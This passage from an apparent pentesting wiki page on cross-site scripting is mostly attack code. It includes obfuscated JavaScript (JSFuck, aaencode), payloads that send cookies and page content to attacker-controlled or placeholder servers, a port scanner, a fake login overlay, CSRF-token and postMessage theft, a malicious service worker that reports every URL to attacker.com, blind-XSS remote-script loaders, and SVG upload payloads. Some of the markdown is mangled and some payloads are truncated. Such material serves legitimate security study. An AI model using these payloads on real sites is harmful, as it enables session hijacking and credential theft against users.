//JSFuck(+\[])\[(\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]])\[+!+\[]+\[+\[]]]+(\[]\[\[]]+\[])\[+!+\[]]+(!\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!!\[]+\[])\[+\[]]+(!!\[]+\[])\[+!+\[]]+(\[]\[\[]]+\[])\[+\[]]+(\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]]+\[])\[!+\[]+!+\[]+!+\[]]+(!!\[]+\[])\[+\[]]+(!+\[]+\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]])\[+!+\[]+\[+\[]]]+(!!\[]+\[])\[+!+\[]]]\[(\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]])\[+!+\[]+\[+\[]]]+(\[]\[\[]]+\[])\[+!+\[]]+(!\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!!\[]+\[])\[+\[]]+(!!\[]+\[])\[+!+\[]]+(\[]\[\[]]+\[])\[+\[]]+(\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]]+\[])\[!+\[]+!+\[]+!+\[]]+(!!\[]+\[])\[+\[]]+(!+\[]+\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]])\[+!+\[]+\[+\[]]]+(!!\[]+\[])\[+!+\[]]]\((!\[]+\[])\[+!+\[]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!!\[]+\[])\[+!+\[]]+(!!\[]+\[])\[+\[]]+(\[]\[(\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]])\[+!+\[]+\[+\[]]]+(\[]\[\[]]+\[])\[+!+\[]]+(!\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!!\[]+\[])\[+\[]]+(!!\[]+\[])\[+!+\[]]+(\[]\[\[]]+\[])\[+\[]]+(\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]]+\[])\[!+\[]+!+\[]+!+\[]]+(!!\[]+\[])\[+\[]]+(!+\[]+\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]])\[+!+\[]+\[+\[]]]+(!!\[]+\[])\[+!+\[]]]+\[])\[\[+!+\[]]+\[!+\[]+!+\[]+!+\[]+!+\[]]]+\[+\[]]+(\[]\[(\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]])\[+!+\[]+\[+\[]]]+(\[]\[\[]]+\[])\[+!+\[]]+(!\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!!\[]+\[])\[+\[]]+(!!\[]+\[])\[+!+\[]]+(\[]\[\[]]+\[])\[+\[]]+(\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]]+\[])\[!+\[]+!+\[]+!+\[]]+(!!\[]+\[])\[+\[]]+(!+\[]+\[]\[(!\[]+\[])\[+\[]]+(\[!\[]]+\[]\[\[]])\[+!+\[]+\[+\[]]]+(!\[]+\[])\[!+\[]+!+\[]]+(!+\[]+\[])\[+\[]]+(!+\[]+\[])\[!+\[]+!+\[]+!+\[]]+(!+\[]+\[])\[+!+\[]]])\[+!+\[]+\[+\[]]]+(!!\[]+\[])\[+!+\[]]]+\[])\[\[+!+\[]]+\[!+\[]+!+\[]+!+\[]+!+\[]+!+\[]]])() \`\`\` \`\`\`javascript //aaencode ﾟωﾟﾉ= /｀ｍ´）ﾉ \~┻━┻ //\*´∇｀\*/ \['\_']; o=(ﾟｰﾟ) =\_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^\_^o)/ (o^\_^o);(ﾟДﾟ)={ﾟΘﾟ: '\_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'\_') \[ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '\_')\[o^\_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'\_')\[ﾟｰﾟ] }; (ﾟДﾟ) \[ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'\_') \[c^\_^o];(ﾟДﾟ) \['c'] = ((ﾟДﾟ)+'\_') \[ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) \['o'] = ((ﾟДﾟ)+'\_') \[ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) \['c']+(ﾟДﾟ) \['o']+(ﾟωﾟﾉ +'\_')\[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'\_') \[ﾟｰﾟ] + ((ﾟДﾟ) +'\_') \[(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'\_') \[ﾟΘﾟ]+((ﾟｰﾟ==3) +'\_') \[(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) \['c']+((ﾟДﾟ)+'\_') \[(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) \['o']+((ﾟｰﾟ==3) +'\_') \[ﾟΘﾟ];(ﾟДﾟ) \['\_'] =(o^\_^o) \[ﾟoﾟ] \[ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'\_') \[ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'\_') \[(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'\_') \[o^\_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'\_') \[ﾟΘﾟ]+ (ﾟωﾟﾉ +'\_') \[ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)\[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)\[o^\_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'\_')\[c^\_^o];(ﾟДﾟ) \[ﾟoﾟ]='\\"';(ﾟДﾟ) \['\_'] ( (ﾟДﾟ) \['\_'] (ﾟεﾟ+(ﾟДﾟ)\[ﾟoﾟ]+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^\_^o) +(o^\_^o))+ ((o^\_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^\_^o) +(o^\_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)\[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^\_^o)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^\_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^\_^o)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^\_^o))+ (ﾟДﾟ)\[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟｰﾟ)+ (c^\_^o)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^\_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^\_^o) +(o^\_^o))+ ((o^\_^o) +(o^\_^o))+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^\_^o) - (ﾟΘﾟ))+ (o^\_^o)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^\_^o)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^\_^o) +(o^\_^o))+ ((o^\_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^\_^o) +(o^\_^o))+ (c^\_^o)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^\_^o) +(o^\_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)\[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^\_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)\[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)\[ﾟoﾟ]) (ﾟΘﾟ)) ('\_'); \`\`\` ## XSS common payloads ### Retrieve Cookies \`\`\`javascript ![](https://github.com/boitatech/hacktricks/tree/14ead4a6929a3874c3681cbe46d7279d0916673d/pentesting-web/xss-cross-site-scripting/x)/?c="+document.cookie> ![](https://github.com/boitatech/hacktricks/tree/14ead4a6929a3874c3681cbe46d7279d0916673d/pentesting-web/xss-cross-site-scripting/x)new Image().src="http://\<IP>/?c="+encodeURI(document.cookie);new Audio().src="http://\<IP>/?c="+escape(document.cookie);location.href = 'http://\<YOUR\_SERVER\_IP>/Stealer.php?cookie='+document.cookielocation = 'http://\<YOUR\_SERVER\_IP>/Stealer.php?cookie='+document.cookiedocument.location = 'http://\<YOUR\_SERVER\_IP>/Stealer.php?cookie='+document.cookiedocument.location.href = 'http://\<YOUR\_SERVER\_IP>/Stealer.php?cookie='+document.cookiedocument.write('\<img src="http://\<YOUR\_SERVER\_IP>?c='+document.cookie+'" />')window.location.assign('http://\<YOUR\_SERVER\_IP>/Stealer.php?cookie='+document.cookie)window\['location']\['assign']\('http://\<YOUR\_SERVER\_IP>/Stealer.php?cookie='+document.cookie)window\['location']\['href']\('http://\<YOUR\_SERVER\_IP>/Stealer.php?cookie='+document.cookie)document.location=\["http://\<YOUR\_SERVER\_IP>?c",document.cookie].join()var i=new Image();i.src="http://\<YOUR\_SERVER\_IP>/?c="+document.cookiewindow.location="https://\<SERVER\_IP>/?c=".concat(document.cookie)var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://\<SERVER\_IP>/?c="%2Bdocument.cookie, true);xhttp.send();eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie) \`\`\` \{% hint style="info" %\} You \*\*won't be able to access the cookies from JavaScript\*\* if the HTTPOnly flag is set in the cookie. But here you have \[some ways to bypass this protection]\(../hacking-with-cookies.md#httponly) if you are lucky enough. \{% endhint %\} ### Steal Page Content \`\`\`javascript var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"; var attacker = "http://10.10.14.8/exfil"; var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { fetch(attacker + "?" + encodeURI(btoa(xhr.responseText))) } } xhr.open('GET', url, true); xhr.send(null); \`\`\` ### Port Scanner \\(fetch\\) \`\`\`javascript const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i::placeholder { color:white; }document.write("\<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'>\<form action='https://example.com/'>\<p>Your sesion has timed out, please login again:\</p>\<input style='width:100%;' type='text' placeholder='Username' />\<input style='width: 100%' type='password' placeholder='Password'/>\<input type='submit' value='Login'>\</form>\<p>\<i>This login box is presented using XSS as a proof-of-concept\</i>\</p>\</div>") \`\`\` ### Auto-fill passwords capture \`\`\`javascript **Username:\</>**\
&#x20; **Password:\</>**\
&#x20; **\`\`\` When any data is introduced in the password field, the username and password is sent to the attackers server, even if the client selects a saved password and don't write anything the credentials will be ex-filtrated. ### Keylogger Just searching in github I found a few different ones: \* \[https://github.com/JohnHoder/Javascript-Keylogger]\(https://github.com/JohnHoder/Javascript-Keylogger) \* \[https://github.com/rajeshmajumdar/keylogger]\(https://github.com/rajeshmajumdar/keylogger) \* \[https://github.com/hakanonymos/JavascriptKeylogger]\(https://github.com/hakanonymos/JavascriptKeylogger) \* You can also use metasploit \`http\_javascript\_keylogger\` ### XSS - Stealing CSRF tokens \`\`\`javascript**\
**var req = new XMLHttpRequest();**\
**req.onload = handleResponse;**\
**req.open('get','/email',true);**\
**req.send();**\
**function handleResponse() {**\
&#x20;   **var token = this.responseText.match(/name="csrf" value="(\w+)"/)\[1];**\
&#x20;   **var changeReq = new XMLHttpRequest();**\
&#x20;   **changeReq.open('post', '/email/change-email', true);**\
&#x20;   **changeReq.send('csrf='+token+'\&email=test@test.com')**\
**};**\
&#x20;**\`\`\` ### XSS - Stealing PostMessage messages \`\`\`markup** ![](https://attacker.com/?)\
&#x20;**window.onmessage = function(e){**\
&#x20;**document.getElementById("message").src += "&"+e.data;**\
&#x20;**\`\`\` ### XSS - Abusing Service Workers A service worker is a \*\*script\*\* that your browser \*\*runs\*\* in the \*\*background\*\*, separate from a web page, opening the door to features that don't need a web page or user interaction. \\(\[More info about what is a service worker here]\(https://developers.google.com/web/fundamentals/primers/service-workers)\\). The goal of this attack is to \*\*create service workers\*\* on the \*\*victim session\*\* inside the \*\*vulnerable\*\* web \*\*domain\*\* that grant the \*\*attacker control\*\* over \*\*all the pages\*\* the \*\*victim\*\* will load in \*\*that domain\*\*. In order to exploit this vulnerability you need to find: \* A way to \*\*upload arbitrary JS\*\* files to the server and a \*\*XSS to load the service worker\*\* of the uploaded JS file \* A \*\*vulnerable JSONP request\*\* where you can \*\*manipulate the output \\(with arbitrary JS code\\)\*\* and a \*\*XSS\*\* to \*\*load the JSONP with a payload\*\* that will \*\*load a malicious service worker\*\*. In the following example I'm going to present a code to \*\*register a new service worke\*\*r that will listen to the \`fetch\` event and will \*\*send to the attackers server each fetched URL\*\* \\(this is the code you would need to \*\*upload\*\* to the \*\*server\*\* or load via a \*\*vulnerable JSONP\*\* response\\): \`\`\`javascript self.addEventListener('fetch', function(e) { e.respondWith(caches.match(e.request).then(function(response) { fetch('https://attacker.com/fetch\_url/' + e.request.url) }); \`\`\` And this is the code that will \*\*register the worker\*\* \\(the code you should be able to execute abusing a \*\*XSS\*\*\\). In this case a \*\*GET\*\* request will be sent to the \*\*attackers\*\* server \*\*notifying\*\* if the \*\*registration\*\* of the service worker was successful or not: \`\`\`javascript**\
**window.addEventListener('load', function() {**\
**var sw = "/uploaded/ws\_js.js";**\
**navigator.serviceWorker.register(sw, {scope: '/'})**\
&#x20; **.then(function(registration) {**\
&#x20;   **var xhttp2 = new XMLHttpRequest();**\
&#x20;   **xhttp2.open("GET", "https://attacker.com/SW/success", true);**\
&#x20;   **xhttp2.send();**\
&#x20; **}, function (err) {**\
&#x20;   **var xhttp2 = new XMLHttpRequest();**\
&#x20;   **xhttp2.open("GET", "https://attacker.com/SW/error", true);**\
&#x20;   **xhttp2.send();**\
&#x20; **});**\
**});**\
&#x20;**\`\`\` In case of abusing a vulnerable JSONP endpoint you should put the value inside \`var sw\`. For example: \`\`\`javascript var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch\_url/' + e.request.url) }) )}//"; \`\`\` There is \*\*C2\*\* dedicated to the \*\*exploitation of Service Workers\*\* called \[\*\*Shadow Workers\*\*]\(https://shadow-workers.github.io/) that will be very useful to abuse these vulnerabilities. ### Polyglots \{% embed url="https://github.com/carlospolop/Auto\\\_Wordlists/blob/main/wordlists/xss\\\_polyglots.txt" %\} ### Blind XSS payloads \`\`\`markup ">**![](https://github.com/boitatech/hacktricks/tree/14ead4a6929a3874c3681cbe46d7279d0916673d/domain/xss) **"> >Click Me For An Awesome Timefunction b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send(); "> ">">**

">

">

$.getScript("//domain")

">![](https://github.com/boitatech/hacktricks/tree/14ead4a6929a3874c3681cbe46d7279d0916673d/pentesting-web/xss-cross-site-scripting/x)

">

\<p title="![](https://github.com/boitatech/hacktricks/tree/14ead4a6929a3874c3681cbe46d7279d0916673d/pentesting-web/xss-cross-site-scripting/x)">

">

````
### Brute-Force List

{% embed url="https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/xss.txt" %}

## XSS Abusing other vulnerabilities

### XSS to SSRF

Got XSS on a **site that uses caching**? Try **upgrading that to SSRF** through Edge Side Include Injection with this payload:

```python
<esi:include src="http://yoursite.com/capture" />
````

Use it to bypass cookie restrictions, XSS filters and much more!\
More information about this technique here: [**XSLT**](xslt-server-side-injection-extensible-stylesheet-languaje-transformations).

### XSS in dynamic created PDF

If a web page is creating a PDF using user controlled input, you can try to **trick the bot** that is creating the PDF into **executing arbitrary JS code**.\
So, if the **PDF creator bot finds** some kind of **HTML** **tags**, it is going to **interpret** them, and you can **abuse** this behaviour to cause a **Server XSS**.

{% content-ref url="xss-cross-site-scripting/server-side-xss-dynamic-pdf" %}
[server-side-xss-dynamic-pdf](xss-cross-site-scripting/server-side-xss-dynamic-pdf)
{% endcontent-ref %}

If you cannot inject HTML tags it could be worth it to try to **inject PDF data**:

{% content-ref url="xss-cross-site-scripting/pdf-injection" %}
[pdf-injection](xss-cross-site-scripting/pdf-injection)
{% endcontent-ref %}

### XSS uploading files (svg)

Upload as an image a file like the following one (from [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):

```markup
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert(1);
   </script>
</svg>
-----------------------------232181429808--
```

```markup
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <script type="text/javascript">alert("XSS")</script>
</svg>
```

```markup
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

## Other JavaScript tricks

### JavaScript Comments

```javascript
//This is a 1 line comment
/* This is a multiline comment*/
#!This is a 1 line comment, but "#!" must to be at the beggining of the line
-->This is a 1 line comment, but "-->" must to be at the beggining of the line


  for (let j = 0; j < 128; j++) {
    for (let k = 0; k < 128; k++) {
      for (let l = 0; l < 128; l++) {
        if (j == 34 || k ==34 || l ==34)
          continue;
        if (j == 0x0a || k ==0x0a || l ==0x0a)
          continue;
        if (j == 0x0d || k ==0x0d || l ==0x0d)
          continue;
        if (j == 0x3c || k ==0x3c || l ==0x3c)
          continue;
        if (
           (j == 47 && k == 47)
           ||(k == 47 && l == 47)
          )
          continue;
    try {
        var cmd = String.fromCharCode(j) + String.fromCharCode(k) + String.fromCharCode(l) + 'a.orange.ctf"';
        eval(cmd);
    } catch(e) {
        var err = e.toString().split('\n')[0].split(':')[0];
        if (err === 'SyntaxError' || err === "ReferenceError")
          continue
        err = e.toString().split('\n')[0]
    }
       console.log(err,cmd);
    }
    }
  }
  //From: https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#bounty-pl33z
```

### Javascript New Lines

```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10) //0x0a
String.fromCharCode(13) //0x0d
String.fromCharCode(8232) //0xe2 0x80 0xa8
String.fromCharCode(8233) //0xe2 0x80 0xa8

  for (let j = 0; j < 65536; j++) {
    try {
        var cmd = '"aaaaa";'+String.fromCharCode(j) + '-->a.orange.ctf"';
        eval(cmd);
    } catch(e) {
        var err = e.toString().split('\n')[0].split(':')[0];
        if (err === 'SyntaxError' || err === "ReferenceError")
          continue;
        err = e.toString().split('\n')[0]
    }
    console.log(`[${err}]`,j,cmd);
  }
//From: https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#bounty-pl33z
```

### **Surrogate Pairs**

This technique won't be very useful for XSS but it could be useful to bypass WAF protections. This python code receive as input 2bytes and it search a surrogate pairs that have the first byte as the the last bytes of the High surrogate pair and the the last byte as the last byte of the low surrogate pair.

```python
def unicode(findHex):
    for i in range(0,0xFFFFF):
        H = hex(int(((i - 0x10000) / 0x400) + 0xD800))
        h = chr(int(H[-2:],16))
        L = hex(int(((i - 0x10000) % 0x400 + 0xDC00)))
        l = chr(int(L[-2:],16))
        if(h == findHex[0]) and (l == findHex[1]):     
            print(H.replace("0x","\\u")+L.replace("0x","\\u"))
```

More info:

* [https://github.com/dreadlocked/ctf-writeups/blob/master/nn8ed/README.md](https://github.com/dreadlocked/ctf-writeups/blob/master/nn8ed/README.md)
* [https://mathiasbynens.be/notes/javascript-unicode](https://mathiasbynens.be/notes/javascript-unicode) [https://mathiasbynens.be/notes/javascript-encoding](https://mathiasbynens.be/notes/javascript-encoding)

## XSS resources

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)\
[http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list) [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list) [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)\
[https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)

### XSS TOOLS

Find some [**tools for XSS here**](xss-cross-site-scripting/xss-tools)**.**

## **Other JavaScript related tricks**

### **.map js files**

* Trick to download .map js files: [https://medium.com/@bitthebyte/javascript-for-bug-bounty-hunters-part-2-f82164917e7](https://medium.com/@bitthebyte/javascript-for-bug-bounty-hunters-part-2-f82164917e7)

### "--" Assignment

The decrement operator `--` is also an asignment. This operator takes a value and then decrements it by one. If that value is not a number, it will be set to `NaN`. This can be used to **remove the content of variables from the environment**.

![](https://1116388331-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-Mks5MA8MikNk7jIq3z3%2Fsync%2F422cbdc04656b69c9fbb012660ee0e7fb11c1047.png?generation=1633028922203021\&alt=media)

![](https://1116388331-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-Mks5MA8MikNk7jIq3z3%2Fsync%2F3b06fd5cd7c54c54cabe443954430392905b5b66.png?generation=1633028922159240\&alt=media)

### Arrow functions

Arrow functions allow you to generate functions in a sigle line more easily (if you understand them)

```javascript
// Traditional
function (a){ return a + 1; }
// Arrow forms
a => a + 100;
a => {a + 100};

// Traditional
function (a, b){ return a + b + 1; }
// Arrow
(a, b) => a + b + 100;

// Tradictional no args
let a = 4;
let b = 2;
function (){ return a + b + 1; }

// Arrow
let a = 4;
let b = 2;
() => a + b + 1;
```

So, most of the previous functions are actually useless because we aren't saving them anywhere to save and call them. Example creating the `plusone` function:

```javascript
// Traductional
function plusone (a){ return a + 1; }

//Arrow
plusone = a => a + 100;
```

### Bind function

The bind function allow to create a **copy** of a **function modifying** the **`this`** object and the **parameters** given.

```javascript
//This will use the this object and print "Hello World"
var fn = function ( param1, param2 ) {
    console.info( this, param1, param2 );
}
fn('Hello', 'World')

//This will still use the this object and print "Hello World"
var copyFn = fn.bind();
copyFn('Hello', 'World')

//This will use the "console" object as "this" object inside the function and print "fixingparam1 Hello"
var bindFn_change = fn.bind(console, "fixingparam1");
bindFn_change('Hello', 'World') 

